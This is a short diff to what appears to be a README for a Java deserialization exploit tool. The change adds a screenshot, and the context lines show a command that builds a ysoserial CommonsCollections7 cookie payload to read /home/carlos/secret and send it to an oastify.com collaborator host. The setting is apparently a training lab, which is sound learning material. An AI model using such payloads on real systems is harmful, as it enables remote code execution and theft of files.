@@ -15,3 +15,4 @@ A copy of `ysoserial-all.jar` (from https://github.com/frohoff/ysoserial) has to
 ```
 ./generate_java_cookie.sh CommonsCollections7 "/home/carlos/secret" https://7fnoyx97nb1dmof2mfvezl6h88ez2rqg.oastify.com
 ```
+<img width="1239" height="442" alt="image" src="https://github.com/user-attachments/assets/79fb034e-7003-408a-a0a5-bb02749a4555" />
